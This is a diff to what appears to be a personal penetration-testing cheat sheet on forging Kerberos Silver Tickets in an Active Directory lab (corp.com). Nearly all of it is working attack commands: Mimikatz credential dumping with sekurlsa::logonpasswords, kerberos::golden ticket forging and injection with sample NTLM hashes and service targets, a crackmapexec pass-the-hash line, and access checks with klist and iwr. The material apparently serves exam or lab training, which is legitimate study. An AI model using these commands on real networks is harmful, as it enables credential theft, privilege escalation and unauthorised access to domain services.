@@ -604,6 +604,7 @@ crackmapexec smb 192.168.1.105 -u Administrator -H 32196B56FFE6F45E294117B91A83B
 ```
 
 ### Silver Tickets (Forge ticket)
+- 3 ingredients: SPN password hash (of user account with access to Target SPN resource), Domain SID, Target SPN
 
 -Silver Ticket Default Groups:
 <aside>
@@ -617,17 +618,15 @@ Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520
 - In Windows, Mimikatz can be used to craft the ticket. Next, the ticket is injected with Rubeus, and finally a remote shell can be obtained thanks to PsExec.
   
 - Obtaining hash of an SPN user using **Mimikatz** (Tool: mimikatz)
-
 ```powershell
 privilege::debug
 sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
 ```
 
 - Obtaining Domain SID
-
 ```powershell
 ps> whoami /user
-# this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain   SID is "S-1-5-21-1987370270-658905905-1781884369"
+# this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain SID is "S-1-5-21-1987370270-658905905-1781884369" i.e. omit RID of "1105"
 ```
 
 - Forging silver ticket (TGS) Ft **Mimikatz**
@@ -642,14 +641,19 @@ mimikatz.exe
 prvilege::debug
 #using NTLM generate the Silver Ticket (TGS) and inject it into memory for current session using /ptt
 kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user> /ptt
-      mimikatz # kerberos: :golden /user:offsec /domain:corp.com /sid: S-1-5-21-4038953314-3014849035-1274281563 /target: CorpSqlServer.corp.com: 1433 /service:MSSQLSvc /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+      kerberos: :golden /user:offsec /domain:corp.com /sid: S-1-5-21-4038953314-3014849035-1274281563 /target:CorpSqlServer.corp.com:1433 /service:MSSQLSvc /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+      kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+
 #using NTLM generate the Silver Ticket (TGS) and inject it into memory for current session and output to ticket.kirbi using /ticket flag
 kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user> /ticket
 #using aeskey generate the Silver Ticket (TGS) and inject it into memory
 kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /aes128:$KRBTGT_AES_128_KEY /user:$DOMAIN_USER /service:$SERVICE_SPN /target:$SERVICE_MACHINE_HOSTNAME
 
-# Checking available tickets in memory with klist
+# Checking if the forged tickets is in memory
 ps> klist
+
+#verify access to targeted SPN
+iwr -UseDefaultCredentials http://web04
 ```
 
 - Inject the ticket (not needed if the TGS is already loaded in current session)
